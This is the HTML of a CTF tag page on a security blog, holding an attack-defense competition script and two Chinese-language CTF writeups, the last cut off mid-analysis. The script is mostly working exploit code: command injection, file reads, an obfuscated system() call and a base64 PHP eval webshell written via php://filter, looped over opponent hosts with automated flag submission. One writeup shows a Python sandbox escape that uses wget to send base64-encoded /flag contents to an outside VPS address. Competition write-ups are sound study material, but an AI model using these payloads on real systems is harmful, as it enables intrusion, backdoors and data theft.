@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Ctf :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/tags/ctf/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Ctf">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://vuln.top/tags/ctf/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/tags/ctf/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+  <div class="posts">
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/awd-flag-script/">AWD FLAG SCRIPT</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2022-04-22 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/awd/">AWD</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/ctf/">CTF</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="awd-flag脚本">AWD FLAG脚本</h1>
+<p>之前AWD的自动写🐴获取flag脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filename</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">+</span>str(int(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">10000000</span>, <span style="color:#ae81ff">99999999</span>)))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.php&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp1</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/test.php&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;system(&#39;cat /flag&#39;);&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># res = re.findall(r&#34;flag{.*}&#34;, r.text)</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp2</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/about.php?file=/flag&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp3</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/editor.php&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;boy&#34;</span>:<span style="color:#e6db74">&#34;cat /flag&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp4</span>(target):
+</span></span><span style="display:flex;"><span>    Filename <span style="color:#f92672">=</span> filename()
+</span></span><span style="display:flex;"><span>    write_backdoor_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/type.php?m=sPD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=&amp;file=php://filter/write=convert.base64-decode/resource=&#39;</span><span style="color:#f92672">+</span>Filename
+</span></span><span style="display:flex;"><span>    getflag_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/&#39;</span><span style="color:#f92672">+</span>Filename
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;system(&#39;cat /flag&#39;);&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>write_backdoor_url)
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[+]Backdoor is Write in :&#34;</span><span style="color:#f92672">+</span>getflag_url
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>getflag_url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># res = re.findall(r&#34;flag{.*}&#34;, r.text)</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp5</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/articlelist.php?a=cat%20/flag&amp;str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp6</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/.aa&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit</span>(flag_value):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://x.x.x.x:8000/api/v1/challenges/attempt&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#34;challenge_id&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;submission&#34;</span>:flag_value})
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;CSRF-Token&#39;</span>: <span style="color:#e6db74">&#39;c7b3f18a7eac5935b8f4279e53be8824fc304d85599c6e5ebd9ae4e701bb640e&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://x.x.x.x:8000&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://x.x.x.x:8000/challenges&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;zh-CN,zh;q=0.9&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#39;PHPSESSID=to9lsb0m9jrpv1hmdg37he5aa2; session=1f8b1fe6-ab39-4fa4-a03d-617a80f0b2b7&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;close&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>    req <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">=</span> url,headers<span style="color:#f92672">=</span>headers,data<span style="color:#f92672">=</span>data,verify <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    print(req<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">15</span>):
+</span></span><span style="display:flex;"><span>        ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;x.x.x.x:3</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">80&#34;</span><span style="color:#f92672">.</span>format(str(i)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp1(ip)</span>
+</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">=</span> exp2(ip)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp3(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp4(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp5(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp6(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># submit(flag)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># a=cat%20/flag&amp;str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));</span>
+</span></span></code></pre></div>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/awd-flag-script/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/guanan2021wp/">观安CTF 2021 WriteUp</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2021-09-05 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="web">WEB</h1>
+<h2 id="baby-calc">Baby Calc</h2>
+<blockquote>
+<p>通过测试发现该环境为python3沙盒逃逸
+通过网上公开的POC发现存在代码执行，但是无法回显
+尝试反弹SHELL均失败
+发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps</p>
+</blockquote>
+<p>如下图使用wget，把命令包含在``中在使用base64带到vps中
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/1.png" alt="1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>expr<span style="color:#f92672">=</span>__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>__getattribute__(<span style="color:#e6db74">&#34;metsys&#34;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])(<span style="color:#e6db74">&#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep</span><span style="color:#e6db74">%20f</span><span style="color:#e6db74">lag|base64`&#34;</span>)
+</span></span></code></pre></div><p>vps监听：
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/2.png" alt="2"></p>
+<h2 id="baby-web">Baby WEB</h2>
+<blockquote>
+<p>题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞</p>
+</blockquote>
+<p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308507210959.jpg" alt="-w1134">
+POC:<code>1|../../../../../../../../flag|</code></p>
+<pre tabindex="0"><code>注册任意用户名，密码为POC，登陆密码为1。
+登陆后返回flag
+</code></pre><p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308507640380.jpg" alt="-w552"></p>
+<h1 id="misc">Misc</h1>
+<h2 id="老电脑的内存">老电脑的内存</h2>
+<p>经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308508816927.jpg" alt="-w966">
+查看缓存在内存中的注册表：
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308508960121.jpg" alt="-w996">
+获取 SAM 表中的用户：
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509103690.jpg" alt="-w1005">
+查看内存中系统的密码：
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509224912.jpg" alt="-w969">
+CMD5解密
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509294061.jpg" alt="-w909">
+通过filescan查找ctf用户下的文件 发现1.png</p>
+<pre tabindex="0"><code>volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf
+</code></pre><p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509546496.jpg" alt="-w1002">
+将1.png dump下来，查看文件。与密码结合获得flag
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509648154.jpg" alt="-w915">
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509739729.jpg" alt="-w997">
+##被加密的wifi
+通过分析数据包发现key为88888888
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510039551.jpg" alt="-w528">
+通过airdecap-ng命令输入密码解密数据包
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510142741.jpg" alt="-w695">
+在已解密的数据包中找到flag
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510348552.jpg" alt="-w974"></p>
+<h2 id="release">release</h2>
+<p>拿到一张图片，首先使用<code>binwalk</code>分离文件，没有发现有用信息
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511070136.jpg" alt="-w696">
+通过winhex修改文件高度
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511475227.jpg" alt="-w813">
+得到一半flag
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511600485.jpg" alt="-w805">
+翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308512337387.jpg" alt="-w854">
+使用脚本转换为图片，得到二维码
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308512567725.jpg" alt="-w826">
+扫描得到flag</p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/guanan2021wp/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/hufuctfweb/">2021年虎符线下赛WEB</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2021-05-09 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/laravel/">Laravel</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h2 id="tinypng">tinypng</h2>
+<p>题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120346.png" alt="">
+首先查看路由信息
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120417.png" alt=""></p>
+<p>先查看一下<code>fileupload</code>路由，可以发现文件上传时对内容进行了过滤，且只允许上传<code>png</code>
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120443.png" alt=""></p>
+<p>接着我们看image路由，进入<code>ImageController</code>，<code>$source</code>可控接着判断是否为<code>png</code>结尾，如果为<code>png</code>结尾则传给<code>imgcompress</code>类。
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120510.png" alt="">
+进入<code>imgcompress</code>类，<code>$this-&gt;src</code>为我们传入的<code>$source</code>
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120529.png" alt="">
+接着又传递给<code>compressImg</code>类，调用了<code>openImg</code>方法
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120551.png" alt=""></p>
+<p>将<code>$source</code>传递给了<code>getimagesize</code>，<code>getimagesize</code>可以触发<code>phar</code>反序列化
